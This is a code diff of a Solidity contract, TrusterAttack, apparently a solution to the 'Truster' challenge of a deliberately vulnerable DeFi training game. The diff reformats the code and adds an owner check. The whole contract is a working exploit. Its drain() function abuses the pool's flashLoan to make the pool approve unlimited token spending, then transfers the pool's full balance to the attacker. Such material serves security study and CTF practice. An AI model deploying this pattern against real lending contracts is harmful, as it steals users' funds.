@@ -1,32 +1,37 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
-import '@openzeppelin/contracts/token/ERC20/IERC20.sol';
-import '../truster/TrusterLenderPool.sol';
+import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+import "../truster/TrusterLenderPool.sol";
 
 contract TrusterAttack {
-	IERC20 immutable token;
-	TrusterLenderPool immutable pool;
+    IERC20 immutable dvt;
+    TrusterLenderPool immutable pool;
+    address immutable owner;
 
-	constructor(address _tokenAddr, address _poolAddr) {
-		token = IERC20(_tokenAddr);
-		pool = TrusterLenderPool(_poolAddr);
-	}
+    constructor(address _dvtAddress, address _poolAddr) {
+        dvt = IERC20(_dvtAddress);
+        pool = TrusterLenderPool(_poolAddr);
+        owner = msg.sender;
+    }
 
-	function drain() public {
-		// Encode approve function() of DVT to be passed as a data parameter in pool's flashLoan()
-		bytes memory data = abi.encodeWithSignature(
-			'approve(address,uint256)',
-			address(this),
-			2**256 - 1
-		);
+    function drain() external {
+        require(msg.sender == owner);
 
-		// Execute flashLoan() with the msg.sender as borrower and DVT contract as target
-		// This does an approval from the pool to this contract.
-		pool.flashLoan(0, msg.sender, address(token), data);
+        // Encode the approve() function of DVT contract with our
+        // desired parameters and store it as "data", to pass this as
+        // parameter in pool's flashLoan() function call.
+        bytes memory data = abi.encodeWithSignature(
+            "approve(address,uint256)",
+            address(this),
+            2**256 - 1
+        );
 
-		// Now this contract is able to drain the pool, transfering all of its tokens from the pool
-		// to the attacker
-		token.transferFrom(address(pool), msg.sender, token.balanceOf(address(pool)));
-	}
+        // Execute flashLoan() function on the pool contract.
+        // This does an approval from the pool to this contract.
+        pool.flashLoan(0, owner, address(dvt), data);
+
+        // Transfer all tokens from pool to attacker
+        dvt.transferFrom(address(pool), owner, dvt.balanceOf(address(pool)));
+    }
 }
